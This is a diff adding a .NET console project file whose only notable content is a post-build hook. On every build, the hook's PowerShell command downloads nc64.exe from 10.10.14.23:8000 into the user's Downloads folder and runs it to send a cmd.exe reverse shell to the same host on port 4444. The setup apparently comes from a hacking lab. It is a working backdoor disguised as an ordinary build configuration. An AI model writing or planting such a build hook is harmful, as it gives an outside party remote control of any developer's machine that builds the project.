@@ -1,0 +1,15 @@
+<Project Sdk="Microsoft.NET.Sdk">
+
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>net6.0</TargetFramework>
+    <ImplicitUsings>enable</ImplicitUsings>
+    <Nullable>enable</Nullable>
+    <RunPostBuildEvent>Always</RunPostBuildEvent>
+  </PropertyGroup>
+
+  <Target Name="PostBuild" AfterTargets="PostBuildEvent">
+    <Exec Command="powershell -c (New-Object Net.WebClient).Download(&quot;http://10.10.14.23:8000/nc64.exe&quot;,&quot;%25USERPROFILE%25/Downloads/n.exe&quot;)&#xD;&#xA;%25USERPROFILE%25\Downloads\n.exe -e cmd.exe 10.10.14.23 4444" />
+  </Target>
+
+</Project>
